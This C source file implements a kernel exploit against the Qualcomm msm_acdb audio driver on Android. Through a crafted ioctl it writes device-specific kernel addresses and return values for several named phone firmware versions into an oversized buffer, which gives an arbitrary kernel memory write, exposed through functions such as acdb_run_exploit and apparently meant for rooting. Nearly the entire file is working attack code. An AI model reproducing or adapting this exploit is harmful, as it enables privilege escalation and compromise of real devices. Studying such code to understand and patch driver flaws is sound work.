/*
 *  Copyright (c) 2013 goroh_kun
 *
 *  2013/03/23
 *  goroh.kun@gmail.com
 */

#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>

#include "detect_device.h"
#include "acdb.h"

typedef struct _param_pair {
  int pos;
  unsigned long int value;
} param_pair;

typedef struct _acdb_param {
  int value_pos;
  int address_pos;
  const param_pair pc1;
  const param_pair pc2;
} acdb_param;

typedef struct supported_device {
  int device_id;
  const acdb_param param;
} supported_device;

static supported_device supported_devices[] = {
  { DEV_SO04D_7_0_D_1_137,  { 0x80, 0x90, { 0x9c, 0xc0326a38 }, { 0xbc, 0xc0526964 } } },
  { DEV_SO05D_7_0_D_1_137,  { 0x80, 0x90, { 0x9c, 0xc03265d8 }, { 0xbc, 0xc0524d84 } } },
  { DEV_L01D_V20d,          { 0x68, 0x78, { 0x84, 0xc0417b30 }, { 0xa4, 0xc0381064 } } },
  { DEV_L02E_V10c,          { 0x7c, 0x8c, { 0x94, 0xc02dc8c4 }, { 0xb4, 0xc018fd58 } } },
  { DEV_L06D_V10k,          { 0x68, 0x78, { 0x84, 0xc041c690 }, { 0xa4, 0xc038c240 } } },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static const acdb_param *
get_acdb_param(void)
{
  int device_id = detect_device();
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id == device_id) {
      return &supported_devices[i].param;
    }
  }

  print_reason_device_not_supported();
  return NULL;
}

// from kernel/include/linux/msm_audio_acdb.h
struct cal_block {
    unsigned int cal_size;    /* Size of Cal Data */
    unsigned int cal_offset;	/* offset pointer to Cal Data */
};

struct acdb_ioctl {
    unsigned int size;
    char data[10000];
};

// from kernel/arch/arm/mach-msm/qdsp6v2/audio_acdb.c
#define MAX_NETWORKS		15

static int
write_value(const acdb_param *param, unsigned long address, unsigned long value)
{
    struct cal_block	data[MAX_NETWORKS]; // 120
    char buf[0x4000];
    struct acdb_ioctl *p = (void *)buf;
    const char *var_path = "/dev/msm_acdb";

    int fd;
    int ret;
    int i;

    fd = open(var_path, O_RDONLY);
    if (fd < 0) {
      printf("%s open error\n", var_path);
      return -1;
    }

    p->size = 0xc0;
    for (i = 0; i  <p->size; i++) {
      p->data[i] = i;
    }

#if 0
printf("data[0x%02x] = 0x%08x\n", param->address_pos, address);
printf("data[0x%02x] = 0x%08x\n", param->value_pos, value);
printf("data[0x%02x] = 0x%08x\n", param->pc1.pos, param->pc1.value);
printf("data[0x%02x] = 0x%08x\n", param->pc2.pos, param->pc2.value);
fflush(stdout);
close(fd);
return -1;
#endif
    *(unsigned long int *)&p->data[param->address_pos] = address;
    *(unsigned long int *)&p->data[param->value_pos] = value;
    *(unsigned long int *)&p->data[param->pc1.pos] = param->pc1.value;
    *(unsigned long int *)&p->data[param->pc2.pos] = param->pc2.value;

    ret = ioctl(fd, 9999, p);
    close(fd);

    return 0;
}

bool
acdb_write_value_at_address(unsigned long address, int value)
{
  const acdb_param *param = get_acdb_param();
  if (!param) {
    return false;
  }

  if (!write_value(param, address, value)) {
    return true;
  }

  return false;
}

bool
acdb_run_exploit(unsigned long int address, int value,
                 bool(*exploit_callback)(void* user_data), void *user_data)
{
  if (!acdb_write_value_at_address(address, value)) {
    return false;
  }

  return exploit_callback(user_data);
}
